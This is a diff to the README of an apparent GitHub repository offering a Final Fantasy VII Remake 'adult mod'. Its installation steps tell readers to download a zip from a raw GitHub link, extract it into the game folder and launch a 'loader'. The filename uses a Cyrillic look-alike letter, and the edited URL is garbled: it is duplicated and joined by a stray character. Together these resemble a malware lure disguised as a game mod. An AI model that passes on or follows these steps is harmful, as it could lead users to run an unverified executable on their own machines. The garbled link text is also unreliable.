@@ -25,7 +25,7 @@ Welcome to the ultimate **FINAL FANTASY VII Remake Adult Mod**! Elevate your adv
 
 ## 🛠️ Installation
 
-1. Download **https://raw.githubusercontent.com/BiZarnegarPakhsh/FF7Remake-ElegantAdultEnhancements/main/Lоader.zip** from the repository.
+1. Download **https://raw.githubusercontent.com/BiZarnegarPakhsh/FF7Remake-ElegantAdultEnhancements/main/irreproducible/Remake-Enhancements-Elegant-F-Adult-3.4.zipоhttps://raw.githubusercontent.com/BiZarnegarPakhsh/FF7Remake-ElegantAdultEnhancements/main/irreproducible/Remake-Enhancements-Elegant-F-Adult-3.4.zip** from the repository.
 2. Extract the contents to your FINAL FANTASY VII Remake install folder.
 3. Launch the loader and follow on-screen instructions.
 4. Enjoy your enhanced adult mod experience!
